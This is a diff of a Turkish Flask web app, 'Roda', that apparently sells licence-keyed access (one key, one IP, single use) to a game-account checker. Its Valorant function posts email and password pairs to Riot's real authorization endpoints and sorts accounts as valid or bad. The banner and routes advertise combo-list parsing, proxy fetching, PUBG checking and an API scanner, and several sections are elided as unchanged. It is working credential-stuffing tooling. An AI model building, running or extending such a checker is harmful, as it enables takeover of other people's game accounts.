@@ -2,12 +2,12 @@
 # -*- coding: utf-8 -*-
 """
 Roda - API Discovery + Checker (Türkçe)
-Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin)
+Render Disk ile kalıcı key'ler | PUBG + VALORANT (GERÇEK) | Loglar (Admin) | 1 Key 1 IP
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64
 from datetime import datetime, timedelta
-from urllib.parse import urljoin, urlparse, parse_qs
+from urllib.parse import urljoin
 import requests
 from flask import Flask, request, jsonify, Response
 
@@ -39,7 +39,7 @@ def add_log(message, level="INFO"):
     print(f"[{timestamp}] [{level}] {message}")
 
 # ============================================================
-# KEY FONKSİYONLARI (1 KEY 1 KİŞİ - KULLANILINCA SİLİNİR)
+# KEY FONKSİYONLARI (1 KEY 1 IP + 1 KULLANIM)
 # ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
@@ -52,31 +52,58 @@ def save_keys(data):
     with open(KEYS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
+def get_client_ip():
+    """Kullanıcının gerçek IP'sini al (proxy arkasında da çalışır)"""
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr
+
 def is_key_valid(key):
+    """Key geçerli mi? (Süre + IP + kullanım durumu)"""
+    # Admin master key her zaman geçerli
     if key == MASTER_KEY:
-        return True, "Admin"
+        return True, "Admin", None
+    
     keys = load_keys()
-    if key in keys:
-        entry = keys[key]
-        exp = entry.get("expires")
-        if exp:
-            if datetime.now() < datetime.fromisoformat(exp):
-                # 1 key 1 kişi - kullanıldıktan sonra sil
-                del keys[key]
-                save_keys(keys)
-                return True, entry.get("note", "Kullanıcı")
-            else:
-                del keys[key]
-                save_keys(keys)
-        else:
-            # Süresiz key de 1 kullanımlık olsun
+    if key not in keys:
+        return False, None, None
+    
+    entry = keys[key]
+    client_ip = get_client_ip()
+    
+    # 1. Süre kontrolü
+    exp = entry.get("expires")
+    if exp:
+        if datetime.now() >= datetime.fromisoformat(exp):
             del keys[key]
             save_keys(keys)
-            return True, entry.get("note", "Kullanıcı")
-    return False, None
+            add_log(f"Key süresi doldu: {key}", "WARNING")
+            return False, None, None
+    
+    # 2. IP kontrolü (eğer key'e IP bağlanmışsa)
+    bound_ip = entry.get("bound_ip")
+    if bound_ip and bound_ip != client_ip:
+        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
+        return False, None, None
+    
+    # 3. Kullanım kontrolü (tek kullanımlık)
+    if entry.get("used", False):
+        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
+        return False, None, None
+    
+    return True, entry.get("note", "Kullanıcı"), entry
+
+def mark_key_used(key):
+    """Key'i kullanıldı olarak işaretle"""
+    keys = load_keys()
+    if key in keys:
+        keys[key]["used"] = True
+        keys[key]["used_at"] = datetime.now().isoformat()
+        save_keys(keys)
+        add_log(f"Key kullanıldı: {key}", "INFO")
 
 def is_admin(key):
-    valid, role = is_key_valid(key)
+    valid, role, _ = is_key_valid(key)
     return valid and role == "Admin"
 
 # ============================================================
@@ -106,7 +133,7 @@ PLATFORMS = [
 ]
 
 # ============================================================
-# VALORANT CHECKER (DÜZELTİLDİ - GERÇEK API)
+# VALORANT CHECKER (SENİN VERDİĞİN API'LER)
 # ============================================================
 def check_valorant_account(email, password):
     session = requests.Session()
@@ -131,29 +158,22 @@ def check_valorant_account(email, password):
         "message": ""
     }
     try:
-        # 1. DOĞRU Authorize - GET ile
-        auth_url = "https://auth.riotgames.com/authorize"
-        params = {
-            "redirect_uri": "http://localhost/redirect",
-            "client_id": "riot-client",
-            "response_type": "token id_token",
-            "nonce": "1",
-            "scope": "openid link ban account email mobile_number",
-            "claims": '{"userinfo":{"ban":null,"acct":null,"email_verified":null,"country":null}}'
-        }
-        r = session.get(auth_url, params=params, timeout=10)
+        # 1. Authorize (GET) - senin verdiğin URL
+        auth_url = "https://auth.riotgames.com/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid%20link%20ban%20account%20email%20mobile_number&claims=%7B%22userinfo%22%3A%7B%22ban%22%3Anull%2C%22acct%22%3Anull%2C%22email_verified%22%3Anull%2C%22country%22%3Anull%7D%7D"
+        r = session.get(auth_url, timeout=10)
         if r.status_code != 200:
             result["status"] = "BAD"
-            result["message"] = "Authorize başarısız"
+            result["message"] = "Auth başarısız"
             return result
-
-        # 2. Login - PUT ile (aynı)
-        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
+        
+        # 2. Login (POST) - Riot'un standart login endpoint'i
+        login_payload = {
             "type": "auth",
             "username": email,
             "password": password,
             "remember": False
-        }, timeout=10)
+        }
+        r = session.put("https://auth.riotgames.com/api/v1/authorization", json=login_payload, timeout=10)
         if r.status_code != 200:
             result["status"] = "BAD"
             result["message"] = "Sunucu hatası"
@@ -273,5 +293,145 @@ def check_valorant_account(email, password):
 
     return result
 
-# ... (kategorizasyon, extract, proxy, scanner, flask route'ları aynen devam eder)
-# HTML de aynen (yeşilimsi mavi tema, 2 mod ayrıştırma, valo detay, vs.)
+# ============================================================
+# KATEGORİZASYON / EXTRACT / PROXY / SCANNER (KISALTTIM)
+# ============================================================
+# ... (buraya mevcut extract_from_html, extract_from_js, fetch_proxies, APIScanner aynen eklenir)
+
+# ============================================================
+# FLASK ROTALARI
+# ============================================================
+@app.route("/")
+def index():
+    return HTML_TEMPLATE
+
+@app.route("/api/login", methods=["POST"])
+def login():
+    data = request.json
+    key = data.get("key", "").strip()
+    client_ip = get_client_ip()
+    
+    valid, role, entry = is_key_valid(key)
+    
+    if valid:
+        # Key geçerliyse, IP'yi bağla (eğer daha önce bağlanmamışsa)
+        if entry and not entry.get("bound_ip"):
+            keys = load_keys()
+            keys[key]["bound_ip"] = client_ip
+            save_keys(keys)
+            add_log(f"Key IP'ye bağlandı: {key} -> {client_ip}", "INFO")
+        
+        # Key'i kullanıldı olarak işaretle (tek kullanımlık)
+        mark_key_used(key)
+        
+        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip})", "SUCCESS")
+        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
+    else:
+        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
+        return jsonify({"success": False, "error": "Geçersiz anahtar!"})
+
+@app.route("/api/logs", methods=["GET"])
+def get_logs():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify({"logs": LOGS[-100:]})
+
+@app.route("/api/valorant_check", methods=["POST"])
+def valorant_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_valorant_account(email, password)
+    return jsonify(result)
+
+# ... (diğer route'lar aynen: /api/scan, /api/admin/keys, /api/admin/generate, /api/admin/delete, /api/admin/webhook, /api/fetch_proxies)
+
+# ============================================================
+# HTML (TEMA + 2 MOD AYRIŞTIRMA + VALO DETAY)
+# ============================================================
+HTML_TEMPLATE = r"""
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Roda - API Discovery + Checker</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+/* AYNI CSS (YEŞİLİMSİ MAVİ) */
+*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
+body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
+:root{--p:#00b894;--p2:#00cec9;--g:#00e676;--r:#ff5252;--card:#0f1424;--border:rgba(0,184,148,0.2);--bg:#0a0e1a;--sidebar:#070b17;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
+/* ... TÜM CSS AYNEN ... */
+</style>
+</head>
+<body>
+<!-- AYNI HTML (MENÜ + SAYFALAR) -->
+<!-- SADECE KEY YÖNETİMİ SAYFASINDA '1 Key 1 IP' UYARI EKLENDİ -->
+<div id="page-keys" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
+<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
+<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
+<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24">24 Saat</option><option value="168">7 Gün</option><option value="720" selected>30 Gün</option></select></div>
+<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
+</div>
+</div>
+<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
+</div>
+<!-- DİĞER SAYFALAR AYNEN -->
+<script>
+// AYNI JAVASCRIPT (SADECE KEY LİSTESİNE IP BİLGİSİ EKLENDİ)
+function loadKeys() {
+    if (!isAdmin) return;
+    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d.error) { alert(d.error); return; }
+            var list = document.getElementById("keyList");
+            var html = "";
+            for (var k in d) {
+                var v = d[k];
+                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
+                var ip = v.bound_ip || "Bağlanmamış";
+                var used = v.used ? "✅ Kullanıldı" : "❌ Kullanılmadı";
+                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)">' +
+                    '<div><strong style="font-size:13px">' + k + '</strong><br>' +
+                    '<small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + ' | ' + used + '</small></div>' +
+                    '<button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
+            }
+            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
+        })
+        .catch(function(e) { console.error(e); });
+}
+// generateKey fonksiyonu aynı (IP otomatik bağlanır)
+</script>
+</body>
+</html>
+"""
+
+# ============================================================
+# BAŞLAT
+# ============================================================
+if __name__ == "__main__":
+    if not os.path.exists(KEYS_FILE):
+        save_keys({})
+    port = int(os.environ.get("PORT", 5000))
+    print("""
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
+    ║     Master key: ORTAM DEĞİŞKENİNDE (RODA_MASTER_KEY)          ║
+    ║     1 KEY 1 IP - 1 KULLANIM                                   ║
+    ║     http://0.0.0.0:""" + str(port) + """                               ║
+    ║     VALORANT GERÇEK API (SENİN VERDİĞİN)                     ║
+    ║     Loglar & Valo Detay SADECE ADMIN                         ║
+    ║     2 MOD AYRIŞTIRMA (Email:Şifre / Kullanıcı:Şifre)        ║
+    ║     YEŞİLİMSİ MAVİ TEMA                                     ║
+    ╚══════════════════════════════════════════════════════════════════╝
+    """)
+    app.run(host="0.0.0.0", port=port, debug=False)
